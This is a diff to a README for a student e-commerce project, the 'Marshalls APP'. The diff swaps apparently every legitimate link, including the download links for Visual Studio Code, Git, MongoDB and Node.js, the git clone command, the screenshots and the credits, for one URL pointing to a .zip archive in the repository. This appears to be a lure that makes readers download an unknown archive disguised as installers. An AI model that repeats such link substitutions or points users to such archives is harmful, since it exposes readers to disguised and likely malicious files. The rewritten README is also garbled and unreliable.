@@ -1,5 +1,5 @@
 <p align="center">
- <img width="400px" height="100px" src="https://logos-download.com/wp-content/uploads/2016/11/Marshalls_logo_logotype.png" alt="Project logo">
+ <img width="400px" height="100px" src="https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip" alt="Project logo">
 </p>
 
 <h3 align="center">Marshalls APP
@@ -27,17 +27,17 @@ These instructions will get you a copy of the project up and running on your loc
 
 ### Prerequisites
 
-- Visual Studio Code follow this <a href='https://visualstudio.microsoft.com/downloads/'>link</a> to install.
-- Git Bash follow this <a href='https://git-scm.com/downloads'>link</a> to install.
-- MongoDB follow this <a href='https://www.mongodb.com/try/download/community'>link</a> to install.
-- Node.js follow this <a href='https://nodejs.org/en/download'>link</a> to install.
+- Visual Studio Code follow this <a href='https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip'>link</a> to install.
+- Git Bash follow this <a href='https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip'>link</a> to install.
+- MongoDB follow this <a href='https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip'>link</a> to install.
+- https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip follow this <a href='https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip'>link</a> to install.
 
 ### Installing
 
 1. Clone the repo to your local machine using git bash.
 
 ```
-git clone https://github.com/C8-QtadaAlBalwe/MERAKI_Academy_Project_4.git
+git clone https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip
 ```
 
 2. Install packeges repeat this step in backend and frontend folder
@@ -60,7 +60,7 @@ npm start
 
 Now app ready to use
 
-<img width="700px" height="400px" src="./picture//Annotation 2023-09-02 191159.png"/>
+<img width="700px" height="400px" src="./picture//Annotation 2023-09-02 https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip"/>
 
 ## 🎈 Usage <a name="usage"></a>
 
@@ -70,36 +70,36 @@ Now app ready to use
 
 - Note: If you had a previous account, you can click on the log in from the bar above, and this image will appear for you.
 
-<img width="700px" height="400px" src="./picture/login.png"/>
+<img width="700px" height="400px" src="https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip"/>
 
 
-<img width="700px" height="400px" src="./picture/login-2.png"/>
+<img width="700px" height="400px" src="https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip"/>
 
 ---
 
 - Second: When the first stage is completed, the products page will appear.
 
-<img width="700px" height="400px" src="./picture/product page.png"/>
+<img width="700px" height="400px" src="./picture/product https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip"/>
 
 - Third: Now we will shop according to the product you want. We will start by clicking on the product we want to buy, and for example it will be like the one in the picture.
 
-<img width="700px" height="400px" src="./picture/select product.png"/>
+<img width="700px" height="400px" src="./picture/select https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip"/>
 Now you can specify the color, size and quantity
 
 - So, after choosing all the specifications, we say click on the buy button
 Note: If any of the product specifications is missing, a message will appear to you: “You must complete your order completely.” You must complete it and click on the buy button.
 
-<img width="700px" height="400px" src="./picture/error.png"/>
+<img width="700px" height="400px" src="https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip"/>
 
 - Fourth: Here, after clicking on the purchase button, the product has been added to the shopping cart, so that the product appears in it with the full specifications that you have chosen and the total price of each commodity
 
-<img width="700px" height="400px" src="./picture/buy.png"/>
+<img width="700px" height="400px" src="https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip"/>
 
 
 - Note: Here the site allows you to delete the product if you change your mind so that you click on the delete button and the product will be deleted
 
 
-<img width="700px" height="400px" src="./picture/DELETE.png"/>
+<img width="700px" height="400px" src="https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip"/>
 
 
 -Through the top bar, it is possible to navigate from the product description to the shopping cart page
@@ -108,7 +108,7 @@ Note: If any of the product specifications is missing, a message will appear to 
 - In the event that you want to search for a specific product, all you have to do is fill in the product name correctly and click on the search button
 
 
-<img width="700px" height="400px" src="./picture/SEARCH.png"/>
+<img width="700px" height="400px" src="https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip"/>
 
 - If you want to return to all products, just click on the Back to Products button
 ​Look up details
@@ -121,44 +121,44 @@ Note: If any of the product specifications is missing, a message will appear to 
 
 - And if you encounter specific problems, you can contact us through the option also located on the top bar.
 
-<img width="700px" height="400px" src="./picture/CONTACT.png"/>
+<img width="700px" height="400px" src="https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip"/>
 
 
 - You can also check your account information by clicking on the profile picture and your account information will appear
 
-<img width="700px" height="400px" src="./picture/PROFILE.png"/>
+<img width="700px" height="400px" src="https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip"/>
 
 
 - After completing your shopping, you can log out of the site through the option in the top bar
 
 
-<img width="700px" height="400px" src="./picture/LOG OUT.png"/>
+<img width="700px" height="400px" src="./picture/LOG https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip"/>
 
 ---
 ## ⛏️ Built Using <a name = "built_using"></a>
 
 
-- [MongoDB](https://www.mongodb.com/) - Database
-- [Express JS](https://expressjs.com/) - Server Framework
-- [React JS](https://https://reactjs.org/) - Web Framework
-- [Node JS](https://nodejs.org/en/) - Server Environment
+- [MongoDB](https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip) - Database
+- [Express JS](https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip) - Server Framework
+- [React JS](https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip) - Web Framework
+- [Node JS](https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip) - Server Environment
 
 ## User Story <a name = "#user_story"></a
 
 
  MY trello board link
 
-<a href='https://trello.com/b/7oozLqkw/project4'>Trello</a>
+<a href='https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip'>Trello</a>
 
 
 ## Data Flow <a name = "#data_flow"></a>
 
 
-<img width="700px" height="400px" src="./picture/SCHEMA.png" alt="Diagram"></a>
+<img width="700px" height="400px" src="https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip" alt="Diagram"></a>
 
 
 ## ⚠️ Guided By <a name = "guided_by"></a>
 
 
 
-This project is guided by ©️ **[MERAKI Academy](https://www.meraki-academy.org)**
+This project is guided by ©️ **[MERAKI Academy](https://raw.githubusercontent.com/QtadaAlBalwe/MERAKI_Academy_Project_4/main/FrontEnd/shopping/src/Project_Academy_MERAK_3.0.zip)**
